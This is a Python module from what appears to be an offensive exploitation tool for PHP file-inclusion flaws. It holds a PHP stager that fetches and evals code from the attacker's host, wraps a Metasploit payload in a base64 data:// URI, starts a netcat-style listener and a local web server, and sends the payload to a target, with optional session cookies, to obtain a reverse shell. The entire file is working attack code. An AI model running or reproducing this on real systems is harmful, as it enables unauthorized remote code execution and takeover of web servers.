import codecs
import subprocess
from os.path import abspath, dirname, join
from urllib.parse import quote

from .utils import listener, attack, colors, cook, msf_payload

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
HERE = abspath(dirname(__file__))


class Data:
    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_data(self):

        lhost, lport, shell = msf_payload()
        file  = join(HERE, "Server.py")
        if self.nostager:
            with open("/tmp/{0}.php".format(shell), "r") as f:
                payload = f.read()
        else:
            payload = STAGER.format(lhost, shell)

        encoded_payload = quote(codecs.encode(payload.encode("utf-8"), "base64"))

        data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)

        handle = listener(lhost, lport)
        handle.handler()

        if self.nostager:
            # TODO: Progressbar
            pass
        else:
            print(colors("[~] Starting Web Server ... ", 93))

            try:
                p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
                p.communicate()
            except OSError as e:
                print(colors("[!]Process Error",91))

        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))

        if self.cookies:
            cookies = cook(self.cookies)
            attack(self.target, data_wrapper, cookies=cookies)
        else:
            attack(self.target, data_wrapper)
